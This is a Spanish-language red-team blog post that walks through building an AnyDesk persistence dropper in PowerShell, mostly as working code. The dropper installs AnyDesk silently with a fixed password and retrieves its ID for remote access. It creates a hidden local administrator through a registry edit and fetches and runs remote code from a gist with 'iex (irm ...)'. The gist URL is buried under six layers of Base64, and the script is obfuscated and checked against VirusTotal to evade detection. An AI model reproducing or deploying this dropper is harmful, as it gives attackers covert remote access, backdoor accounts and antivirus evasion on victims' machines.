---
title: Dropper de AnyDesk y métodos de persistencia
description: En este post elaboraremos un dropper con el cual podremos establecer persistencia con un ejecutable real de Anydesk y establecer algunos métodos de persistencia en máquinas victimas. 
date: 2025-11-20
categories: [Persistencia]
tags: [ofuscación, bypass, evasion, malware, opsec, persistencia]     # Los tags deben estar siempre en minúsculas.
image:
  path: /assets/img/dropper/dropper.png

---
## 1. Introducción al dropper

En muchas ocasiones abstraemos técnicas y actividades de Red Teaming de entornos reales, por ello me gusta estar al día con todos los artículos de [**The DFIR Report**](https://thedfirreport.com/). Revisando un poco me encontré este post llamado [**From IcedID to Dagon Locker Ransomware in 29 Days**](https://thedfirreport.com/2024/04/29/from-icedid-to-dagon-locker-ransomware-in-29-days/#persistence) , en el cual se explican una serie de métodos de persistencia y entre ellos un fichero powershell que ayuda a generar persistencia mediante anydesk. Lo que vamos a realizar en este post es algo similar y mejorar algunos puntos, por lo que vamos a definir objetivos:

1. Generar un dropper Powershell que descargue e instale AnyDesk de manera silenciosa
2. Consultar un repositorio público que nos ayude a continuar con los pasos
3. Generar un usuario administrador con los parámetros definidos en el repositorio
4. Modificaremos mediante el contenido del repositorio un registro de cara a mejorar la persistencia.
5. Ofuscar el contenido de nuestro dropper.

La idea es trabajar el OPSEC de nuestro pequeño instalador para evitar que la detección no venga del analisis del dropper y evitar que nos detecten el fichero. <br>
Es importante entender que vamos a partir de un acceso inicial, es decir que o 1)El usuario ha ejecutado nuestro dropper tras un phishing o con una macro o similar o 2)Hemos comprometido una máquina y utilizado el dropper custom para automatizar la persistencia. 


## 2. ¿Porqué anydesk? ¿Que queremos hacer realmente?

Si has trabajado en entornos de administración de sistemas sabrás que la administración remota es un quebradero de cabeza de los equipos. ¿Como hacemos para conectarnos a otra oficina? ¿Abrimos y permitimos RDP en todas las máquinas? ¿Contamos con la proactividad del usuario? ¿Que software usamos? ¿Como hacemos todo esto gratis? Dentro de todo esto empiezan a surgir los problemas. Dependiendo de tu entorno tendrás más o menos control de que hay instalado y que puedes instalar, pero dentro de todo pese a que sea el entorno más inmaduro tendrás un AV mínimo que te permita funcionar "algo" más tranquilo (esté o no administrado). Ahora ¿Controlas que no se pueda no solo instalar software sino cierto software? ¿Eres capaz de controlar que nadie se instale un AnyDesk o cualquier otro cliente? En entornos maduros detectar las firmas del software te permitirá que no haya ningún usuario listo (ni nosotros en esta PoC) que se aproveche de un software firmado y bien intencionado. Nosotros hoy nos vamos a aprovechar de dos cosas fundamentalmente. 

1. Anydesk es un programa conocido que no haría sospechar a un usuario si aparece en su escritorio.
2. Anydesk es un software legitimo, firmado y público el cual no va ser detectado como un virus persé (por lo que limitamos detecciones).

> Ten en cuenta que puedes usar cualquier software, hay muchisimo software de gestión remota, simplemente AnyDesk es uno más. Quizás en otro entorno puede venirte bien otra cosa.
{: .prompt-tip }

## 3. Generando un dropper de Anydesk

Lo que vamos a hacer en este paso es crear un dropper en powershell que nos permita descargar e instalar anydesk basandonos en el del actor que os he enseñado antes de [**The DFIR Report**](https://thedfirreport.com/2024/04/29/from-icedid-to-dagon-locker-ransomware-in-29-days/#persistence) . En mi caso me voy a ayudar un poco de ChatGPT para el código, pero recomiendo no hacer las cosas a lo bruto ya que no tarda en detectar tus intenciones (Así como en ocasiones realiza chapuzas). 

Los pasos que queremos que realice nuestro dropper en este momento son los siguientes:

1. Verifica que existe la carpeta C:\ProgramData\AnyDesk y en tal caso se para
2. Crea la carpeta C:\ProgramData\AnyDesk
3. Descarga AnyDesk.exe 4- Lo instala en silencio (--silent) y con inicio con Windows.
5. Establece una contraseña.
6. Obtiene el ID de AnyDesk.
De manera adicional voy a hacer que el script autoalmacene una copia de su propio contenido en C:\Windows\Tasks la cual es una ruta la cual el propio usuario suele tener capacidad de ejecución de cara a la persistencia posterior.

Puedes acceder a este código en mi repositorio [**dropper anydesk**](https://github.com/c0nfig-17/dropper-anydesk/blob/main/dropper.ps1)

```powershell
param(
    [string]$InstallDir   = "C:\ProgramData\AnyDesk",
    [string]$AnyDeskExe   = "C:\ProgramData\AnyDesk.exe",   # lo usamos como instalador
    [string]$AnyDeskUrl   = "https://download.anydesk.com/AnyDesk.exe",
    [string]$AnyDeskPass  = "J9kzQ2Y0q0"
)

Write-Host "=== Instalacion de AnyDesk ==="

# Rutas internas
$InstallerExe = $AnyDeskExe
$InstalledExe = Join-Path $InstallDir "AnyDesk.exe"

# 1) Si ya existe carpeta + exe instalado, no reinstalamos, solo avisamos
$needInstall = $true

$installDirExists = Test-Path -Path $InstallDir
$exeInstalled     = Test-Path -Path $InstalledExe

if ($installDirExists -and $exeInstalled) {
    Write-Host "[*] AnyDesk ya parece instalado en $InstallDir. Omitiendo descarga/instalación."
    $needInstall = $false
}

# 2) Si hay que instalar, creamos carpeta + descargamos + instalamos
if ($needInstall) {
    Write-Host "[*] Creando carpeta de instalacion en $InstallDir ..."
    try {
        New-Item -Path $InstallDir -ItemType Directory -Force | Out-Null
    }
    catch {
        Write-Host "[!] Error al crear la carpeta: $($_.Exception.Message)"
        return
    }

    Write-Host "[*] Descargando AnyDesk desde $AnyDeskUrl a $InstallerExe ..."
    try {
        Invoke-WebRequest -Uri $AnyDeskUrl -OutFile $InstallerExe -UseBasicParsing
    }
    catch {
        Write-Host "[!] Error descargando AnyDesk: $($_.Exception.Message)"
        return
    }

    if (-not (Test-Path $InstallerExe)) {
        Write-Host "[!] No se encontro el instalador en $InstallerExe"
        return
    }

    Write-Host "[*] Instalando AnyDesk en modo silencioso..."
    try {
        # Lanzamos el instalador con el directorio de trabajo en $InstallDir
        $arguments = "--install `"$InstallDir`" --start-with-win --silent"
        $proc = Start-Process -FilePath $InstallerExe `
                              -ArgumentList $arguments `
                              -WorkingDirectory $InstallDir `
                              -PassThru -Wait
        Write-Host "[*] Comando de instalacion ejecutado. ExitCode (informativo): $($proc.ExitCode)"
    }
    catch {
        Write-Host "[!] Error ejecutando la instalacion: $($_.Exception.Message)"
    }

    Start-Sleep -Seconds 5

    if (-not (Test-Path $InstalledExe)) {
        Write-Host "[!] No se encontro el binario instalado en $InstalledExe"
        return
    }
}

# 3) Establece contraseña usando el ejecutable instalado
if ($AnyDeskPass -and $AnyDeskPass.Trim() -ne "") {
    Write-Host "[*] Configurando la contraseña de AnyDesk..."
    try {
        # Cambiamos el directorio actual a la carpeta de AnyDesk
        Push-Location $InstallDir
        try {
            $cmd = "echo $AnyDeskPass | `"$InstalledExe`" --set-password"
            cmd.exe /c $cmd | Out-Null
        }
        finally {
            Pop-Location
        }
    }
    catch {
        Write-Host "[!] Error configurando la contraseña: $($_.Exception.Message)"
    }
}
else {
    Write-Host "[!] No se ha configurado contraseña porque está vacía."
}

# 4) Obtiene el ID de AnyDesk desde el ejecutable instalado
Write-Host "[*] Obteniendo el ID de AnyDesk..."
try {
    $psi = New-Object System.Diagnostics.ProcessStartInfo
    $psi.FileName               = $InstalledExe
    $psi.Arguments              = "--get-id"
    $psi.UseShellExecute        = $false
    $psi.RedirectStandardOutput = $true
    $psi.CreateNoWindow         = $true
    $psi.WorkingDirectory       = $InstallDir   # <-- clave para que no ensucie la carpeta del script

    $proc = [System.Diagnostics.Process]::Start($psi)
    $id   = $proc.StandardOutput.ReadToEnd().Trim()
    $proc.WaitForExit()

    if ($id) {
        Write-Host "[*] ID de AnyDesk: $id"
    }
    else {
        Write-Host "[!] No se recibio ningun ID desde AnyDesk."
    }
}
catch {
    Write-Host "[!] Error al obtener el ID: $($_.Exception.Message)"
}

Write-Host "=== Proceso terminado ==="

```

Para ejecutarlo tendremos que desactivar las restricciones de powershell con:

```powershell
Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
```

Posteriormente ejecutamos el script
![Desktop View](/assets/img/dropper/1.png)

Podremos ver el proceso en segundo plano generado.
![Desktop View](/assets/img/dropper/2.png)

Simplemente necesitamos usar el ID de AnyDesk que nos han provisto y la contraseña que hemos introducido en el dropper para así poder acceder remotamente a la máquina.
![Desktop View](/assets/img/dropper/3.png)



## 4. Dropear persistencias adicionales

Vamos a tratar de subir métodos de persistencia a un servicio online el cual consultaremos de cara a que no nos detecten el archivo al caer y encuentre estas. Para esto voy a recomendar un recurso que me ha parecido espectacular de [**mrdox**](https://x.com/mrd0x) llamado [**LOTS: Living off Trusted Sites**](https://lots-project.com/) . <br>
En mi caso lo que voy a hacer es usar github para alojar las partes de código que añadan los registros y creen los usuarios.  <br>

Para la creación del usuario generaremos el usuario admin_malicioso

```text
net user admin_malicioso "galleta1234" /add
net localgroup Administradores admin_malicioso /add
```

Posteriormente vamos a ocultar la existencia de la cuenta en el logon mediante una modificación en el registro

```text
reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\Userlist" /v admin_malicioso /t REG_DWORD /d 0 /f
```

En este punto lo que vamos a hacer es subir a un repositorio el contenido de cara a evitar llevarlo en el dropper y dificultar la detección.

![Desktop View](/assets/img/dropper/4.png)

Posteriormente introduciremos esta línea de código en nuestro script de cara a que cada vez que se ejecute llame al repositorio y lo descargue

```text
iex (irm 'https://gist.githubusercontent.com/c0nfig-17/ad25b00a20507ce7a0aa78ee2ec89ed1/raw/fdedbb922474ed73990698df51e3fa23be7137c6/just_persistance')
```

Ejecutamos el script de nuevo y vemos que todo ha sido ejecutado y parece que todo ha salido bien. 
![Desktop View](/assets/img/dropper/5.png)

Como podemos ver se ha generado el usuario en mi máquina como administrador.

![Desktop View](/assets/img/dropper/6.png)



## 5. Ofuscación y evasión

Como vemos con VirusTotal hemos hecho bien los deberes:
1. Tenemos un dropper que descarga AnyDesk que es un software legal y firmado.
2. Usamos recomendaciones como las que incluye [**LOTS: Living off Trusted Sites**](https://lots-project.com/) por lo que nos descargamos la parte que puede tener un comportamiento irregular de un sitio reputado.
3. Nuestro script no ha sido ejecutado más que por nosotros, por lo que no hay nadie que lo haya detectado todavía o usado de manera maliciosa, eso hace que los motores de analisis de malware no lo detecten y parezca un simple powershell. 

![Desktop View](/assets/img/dropper/7.png)

En este punto lo que vamos a hacer es incluir mejoras a nuestro código de cara a que en caso de que alguien quiera analizar su contenido se encuentre con algún que otro problemilla. 

> Es bastante lógico, pero nadie mantendría comentarios explicando paso a paso el contenido del código o una salida descriptiva del mismo en su ejecución cuando lo despliega... Es importante que todo eso se eliminase en un caso real. 
{: .prompt-tip }

## 5.1 Llamadas en BASE64 a gist

En mi caso el punto que conecta con información que podría llegar a ser interesante para el lector es la llamada a github. Lo que voy a hacer en primer lugar es encodear. Vamos a hacer una cosa muy sencilla, encodearemos 6 veces la URL la cual va hacia el repositorio de github mediante [**Cyberchef**](https://gchq.github.io/CyberChef/), aunque lo puedes hacer con otro recurso si te es más sencillo. 

![Desktop View](/assets/img/dropper/8.png)

Nos tocará introducir esto en nuestro dropper y quedará algo así. 

```powershell
# 6) Carga y ejecucion del modulo de persistencia remoto usando Base64 multilayer
Write-Host "=== Persistencia adicional (just_persistance) ==="
try {
    # Base64 multilayer de la URL de just_persistance (encodeada 6 veces)
    $b64    = 'VmpGYVYySXhWWGROVldoVllUSjRWbFpyV25kVWJIQlhWVzVPYTFadGVGaFpWVlUxVkd4S1dXRkVRbGhoTW1oRVdWUkdTbVZXYjNwaFJtaFhaV3hhV1Zkc1pEUmtNV1JYVkc1U2FsSXllRTlaVjNoWFRURlplV1ZIY0U1V1ZFWkhXbFZvVTFaWFNuTmpTRUpYVjBoQ2Vsa3hXbE5XYkd3MlVtMXNWMDFHY0ZwV01WSlBWVEZTYzFkcmFGVmhhM0JaVm0weFUxVXhjRmRXVkVaWVVtczFXbGRyVlRGVk1ERkhWMVJHVjFKc1dsUldiVEZTWkRBMVNXSkdWbWxYUjJoUlZrWmtNRll3TUhoYVJtUmhVbFp3VDFSVlVuTlRWbHAwVFZSU1ZXSlZjRmhXTWpWSFZsVXhSMU51Y0ZwaE1YQXpWV3hhUzFkV1pIUmpSMnhYVm0xM01sWnJWbE5UTVd4WVVsaG9hbEp0YUZkWmJHUTBXVlpzV0UxVVFrOVdiRXBaV1RCYVMxUnJNVVZXYTJ4WFlsUkZkMVpFU2xkamF6RkZVbXhXVGxacmNFUldSbVI2VGxaYVdGSnJhR3RTTUZwdldXdGFXazFHV1hsbFJrNVZUV3R3V0ZscldsZFdSbVJKVVcxR1dtSkdjRmRhVjNoVFZqRldjazVWTlU1V00yTjVWbXBHYjFsWFJraFRiazVZWVd4d2FGVnNXbkpOVm5CRlVtNWtXRlpyTlRGWk1HUnZWMFpLVlZWcVRsZE5WbkJ4VkZaa1IyTXlUa2RUYkVaWFVrVkZOUT09'
    $layers = 6

    $data = $b64
    for ($i = 0; $i -lt $layers; $i++) {
        $data = [System.Text.Encoding]::UTF8.GetString(
            [System.Convert]::FromBase64String($data)
        )
    }

    # Al final $data contiene la URL del gist just_persistance
    iex (irm $data)
```

Lo volvemos a ejecutar y el funcionamiento es el mismo, simplemente hemos dificultado la lectura.

![Desktop View](/assets/img/dropper/9.png)

> Puedes ganar tiempo encodeando también en el propio gist el contenido de cara a seguir dificultando su lectura una vez llegue a tu máquina. Es verdad que solo estás dificultando su lectura, pero dificulta su lectura.
{: .prompt-tip }


## 5.2 Ofuscación de powershell

En mi caso usaré el proyecto [**psobf**](https://github.com/TaurusOmar/psobf) escrito en go que está preparado para ofuscar código powershell. He usado una opción poco rebuscada

```text
psobf -i dropper.ps1 -o out.ps1 -level 5
```

![Desktop View](/assets/img/dropper/10.png)

Podemos ver el contenido y luce algo así

![Desktop View](/assets/img/dropper/11.png)

Vuestro escritorio en este punto parecerá algo así, calma porque es común.

![Desktop View](/assets/img/dropper/meme.jpeg)

Probamos a ejecutarlo y nos seguirá funcionando sin problema 

![Desktop View](/assets/img/dropper/12.png)


Si bien en este punto hemos conseguido ofuscar el contenido y dificultar su lectura hemos levantado algunos IOCs que la IA ha sido capaz de analizar ya que la ofuscación en este tipo de cosas llama demasiado la atención. El punto positivo de una persitencia así es todo lo contrario, y puede ser innecesario en algunos casos, depende de la estrategia que se quiera llevar y el activo en el que se encuentre. El mismo script sin ofuscación podría levantar menos alertas que con la ofuscación. Es por ello que, pese a que ayude a dificultar su contenido, el objetivo de esta persistencia sería levantar poco ruido. 

![Desktop View](/assets/img/dropper/13.png)


¿Ha estado chulo no? Espero que os haya servido de ayuda. Teneís los 3 scripts que hemos ido viendo en este repositorio [**dropper-anydesk**](https://github.com/c0nfig-17/dropper-anydesk) en el que podeís consultar todo lo que se ha realizado.

![Desktop View](/assets/img/dropper/14.jpeg)


---
## Apoya el contenido de ciberseguridad en castellano

Si esta publicación te ha sido útil y quieres apoyar mi trabajo para que continúe creando más contenido, aquí te dejo algunas formas de apoyar:

1. **Compartir el contenido**  📲
   Si crees que esta guía puede ser útil para otras personas, compartirla en tus redes sociales es una gran ayuda. 

2. **Donar en Ko-fi**  💖
   Puedes hacer una donación rápida a través de Ko-fi para ayudarme a seguir publicando guías y tutoriales. ¡Cada aportación cuenta y es muy apreciada! 

   <script type='text/javascript' src='https://storage.ko-fi.com/cdn/widget/Widget_2.js'></script><script type='text/javascript'>kofiwidget2.init('Apoya este contenido!', '#455d85', 'A0A41BO608');kofiwidget2.draw();</script> 
   
3. **Usa mi enlace de afiliado de NordVPN y NordPass para mejorar tu seguridad y apoyar la creación de contenido**  🛡️
   Puedes suscribirte a [**NordVPN**](https://go.nordvpn.net/aff_c?offer_id=15&aff_id=132246&url_id=902) con un 75% de descuento y 3 meses gratis o a [**NordPass**](https://nordpass.com/special/?utm_medium=affiliate&utm_term&utm_content&utm_campaign=off488&utm_source=aff132246&aff_free) con un 53% de descuento y 3 meses gratis y mejorar tu seguridad a la vez que apoyas el contenido de ciberseguridad en español. <br>


---

¡Gracias por tu apoyo! 🙏
![Desktop View](/assets/img/banner.png) <br>

